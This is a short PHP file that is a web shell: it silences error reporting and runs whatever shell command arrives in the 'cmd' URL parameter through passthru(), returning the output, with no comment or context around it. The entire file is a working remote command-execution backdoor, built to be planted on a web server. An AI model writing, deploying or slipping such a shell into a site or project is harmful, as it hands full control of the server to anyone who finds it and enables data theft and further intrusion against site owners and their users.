<?php
@error_reporting(0);
if(isset($_GET['cmd'])) {
    @passthru($_GET['cmd']);
    exit;
}
?>
